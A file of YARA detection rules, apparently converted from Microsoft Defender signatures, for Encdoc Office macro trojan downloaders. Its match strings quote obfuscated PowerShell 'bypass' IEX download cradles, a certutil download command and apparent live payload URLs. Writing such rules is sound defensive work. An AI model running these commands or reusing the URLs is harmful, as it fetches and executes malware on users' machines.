rule TrojanDownloader_O97M_Encdoc_AK_2147753350_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Encdoc.AK!MTB"
        threat_id = "2147753350"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Encdoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://dev.katevictoriabeauty.co.uk/gphxtbi/530340.png" ascii //weight: 1
        $x_1_2 = "JJCCCJ" ascii //weight: 1
        $x_1_3 = "dToFileA" ascii //weight: 1
        $x_1_4 = "C:\\Datop\\" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Encdoc_AM_2147753404_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Encdoc.AM!MTB"
        threat_id = "2147753404"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Encdoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://gracefullifetime.com/yqagtiljgk/530340.png" ascii //weight: 1
        $x_1_2 = "JJCCCJ" ascii //weight: 1
        $x_1_3 = "dToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Encdoc_PRB_2147753809_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Encdoc.PRB!MTB"
        threat_id = "2147753809"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Encdoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "enc = StrReverse(enc)" ascii //weight: 1
        $x_1_2 = "= 1 To Len(enc)" ascii //weight: 1
        $x_1_3 = {3d 20 4d 69 64 28 65 6e 63 2c 20 [0-2] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_4 = {41 70 70 44 61 74 61 20 3d 20 [0-10] 41 70 70 44 61 74 61 20 26 20 43 68 72 28 41 73 63 28 [0-2] 29 20 2d 20 31 29}  //weight: 1, accuracy: Low
        $x_1_5 = {28 22 66 79 66 2f [0-10] 22 29}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 45 6e 76 69 72 6f 6e 24 28 22 [0-10] 41 70 70 44 61 74 61 22 29 20 26 20 22 5c 22 20 26 20}  //weight: 1, accuracy: Low
        $x_1_7 = {28 22 66 79 66 2f [0-48] 2f 68 6f 6a 6d 73 76 69 2e 74 6b 2f 78 78 78 30 30 3b 74 71 75 75 69 22 29}  //weight: 1, accuracy: Low
        $x_1_8 = {30 2c 20 22 6f 70 65 6e 22 2c 20 [0-150] 2c 20 22 22 2c 20 76 62 4e 75 6c 6c 53 74 72 69 6e 67 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Encdoc_G_2147758402_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Encdoc.G!MSR"
        threat_id = "2147758402"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Encdoc"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd.ExE  /c POwErShEll  -EX bYPaSs -Nop -W 1" ascii //weight: 1
        $x_1_2 = "IEX( InVoke-WEBRequeST  ('htt'  + 'ps://file.io/9qX7IJhiPC'  + 'RK'" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Encdoc_KA_2147759407_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Encdoc.KA!MTB"
        threat_id = "2147759407"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Encdoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://www.remsoft.it/conrol/pack.php" ascii //weight: 1
        $x_1_2 = "C:\\ProgramData\\vKrJuyZ.exe" ascii //weight: 1
        $x_1_3 = "ShellExecuteA" ascii //weight: 1
        $x_1_4 = "CreateDirectoryA" ascii //weight: 1
        $x_1_5 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Encdoc_PNC_2147760594_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Encdoc.PNC!MTB"
        threat_id = "2147760594"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Encdoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmD.eXE  /c powErSHElL  -ex bypaSs -nop -w 1" ascii //weight: 1
        $x_1_2 = "iEX( cUrl  ('https://texntrade.co.uk/link/ex'  + 'cel.j'  + 'p'  + 'g' ))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Encdoc_PVB_2147774230_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Encdoc.PVB!MTB"
        threat_id = "2147774230"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Encdoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "EXEC(\"powersh\"&CHAR(D108)&\"ll -w 1 (nEw-oB`jecT" ascii //weight: 1
        $x_1_2 = "&CHAR(104)&\"ttp://urgfuid.gq/z/z.exe" ascii //weight: 1
        $x_1_3 = "D\"&CHAR(101)&\"stination \"\"${enV`:appdata}" ascii //weight: 1
        $x_1_4 = "bypass Star\"&CHAR(116)&\"-Sle\"&CHAR(D108)&\"p 25" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Encdoc_PKE_2147810706_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Encdoc.PKE!MTB"
        threat_id = "2147810706"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Encdoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 39 31 2e 39 32 2e 31 32 30 2e 31 32 36 2f [0-31] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-47] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Encdoc_PKE_2147810706_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Encdoc.PKE!MTB"
        threat_id = "2147810706"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Encdoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"c\" + \"m\" + \"d" ascii //weight: 1
        $x_1_2 = "= \"msgbox/rm\" + \"sh\" + \"ta" ascii //weight: 1
        $x_1_3 = "= \"https://bitbucket.org/!api/2.0/" ascii //weight: 1
        $x_1_4 = "= \"snippets/hogya/" ascii //weight: 1
        $x_1_5 = "= u5 + u6 + u7 + u8" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Encdoc_PKE_2147810706_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Encdoc.PKE!MTB"
        threat_id = "2147810706"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Encdoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "23"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "= Environ$(\"AppData\") & \"\" &" ascii //weight: 2
        $x_2_2 = "= WshShell.SpecialFolders(\"Recent\")" ascii //weight: 2
        $x_2_3 = "= CreateObject(\"WScript.Shell\")" ascii //weight: 2
        $x_10_4 = "(\"fyf/dsdd\")" ascii //weight: 10
        $x_10_5 = "(\"fyf/dklopjbgnkhoygoh0wkihkyghyggh{etgiwclw{tehgwtewt0npd/hojmsvi.tk/xxx00;tquui\")" ascii //weight: 10
        $x_2_6 = ".Open \"get\"," ascii //weight: 2
        $x_2_7 = "= SpecialPath +" ascii //weight: 2
        $x_5_8 = "Range(\"A1\").Value = \"resizing...." ascii //weight: 5
        $x_5_9 = "MsgBox \"resizing...." ascii //weight: 5
        $x_2_10 = "= StrReverse(enc)" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_5_*) and 4 of ($x_2_*))) or
            ((1 of ($x_10_*) and 2 of ($x_5_*) and 2 of ($x_2_*))) or
            ((2 of ($x_10_*) and 2 of ($x_2_*))) or
            ((2 of ($x_10_*) and 1 of ($x_5_*))) or
            (all of ($x*))
        )
}

